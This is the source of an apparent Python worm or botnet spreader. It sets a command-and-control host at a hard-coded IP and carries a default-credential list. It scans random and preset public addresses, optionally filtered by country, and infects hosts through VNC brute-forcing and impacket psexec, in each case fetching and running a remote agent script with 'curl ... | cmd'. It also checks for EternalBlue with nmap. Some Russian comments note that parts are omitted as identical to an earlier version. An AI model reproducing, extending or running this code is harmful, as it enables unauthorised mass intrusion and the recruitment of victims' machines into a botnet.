#!/usr/bin/env python3
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 800
QUICK_TIMEOUT = 2.0
BRUTE_TIMEOUT = 2.5
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 3306, 3389, 445, 5432, 5900, 5985, 6379, 8080, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1",
    "103.235.46.39","103.235.46.40","103.235.46.41","103.235.46.42","103.235.46.43",
    "103.235.46.44","103.235.46.45","103.235.46.46","103.235.46.47","103.235.46.48",
    "103.235.46.49","103.235.46.50","103.235.46.51","103.235.46.52","103.235.46.53",
    "103.235.46.54","103.235.46.55","103.235.46.56","103.235.46.57","103.235.46.58",
    "103.235.46.59","103.235.46.60","103.235.46.61","103.235.46.62","103.235.46.63",
    "103.235.46.64","103.235.46.65","103.235.46.66","103.235.46.67","103.235.46.68",
    "103.235.46.69","103.235.46.70",
    "8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4",
    "91.121.83.11", "185.220.101.34", "45.77.165.101", "34.94.3.1", "45.33.32.157",
    "45.56.89.1", "45.79.207.1", "185.225.19.1", "103.15.28.1"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("countryCode", "")
    except:
        pass
    return ""

def is_country_allowed(ip):
    if not TARGET_COUNTRY:
        return True
    return get_country(ip) == TARGET_COUNTRY

def random_ip():
    if random.random() < 0.8 and GUARANTEED_IPS:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10: continue
        if a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        ip = f"{a}.{b}.{c}.{d}"
        if is_country_allowed(ip):
            return ip

# ... (все векторы, worker, scan_cycle, main_async – полностью из v25.19, плюс добавлены vnc_brute и eternalblue_exploit)
# Ниже приведены только новые векторы, остальной код идентичен v25.19

async def vnc_brute(ip):
    try:
        from vncdotool import api
        for pw in ['', 'password', 'admin', '123456', 'root']:
            try:
                client = api.connect(ip, password=pw)
                client.keyPress('win-r')
                time.sleep(0.2)
                client.typeText(f'cmd.exe /c curl -s {AGENT_URL} | cmd')
                client.keyPress('enter')
                client.disconnect()
                return True
            except:
                continue
    except ImportError:
        pass
    return False

async def eternalblue_check(ip):
    try:
        proc = await asyncio.create_subprocess_shell(f"nmap -p 445 --script smb-vuln-ms17-010 {ip}", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        stdout, _ = await proc.communicate()
        if b"VULNERABLE" in stdout:
            return True
    except:
        pass
    return False

async def eternalblue_exploit(ip):
    for u, p in CREDS[:3]:
        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode == 0:
                return True
        except:
            pass
    return False

# В функции infect добавлены:
# if open_ports[10] and await vnc_brute(ip): ...
# if open_ports[5] and await eternalblue_check(ip) and await eternalblue_exploit(ip): ...
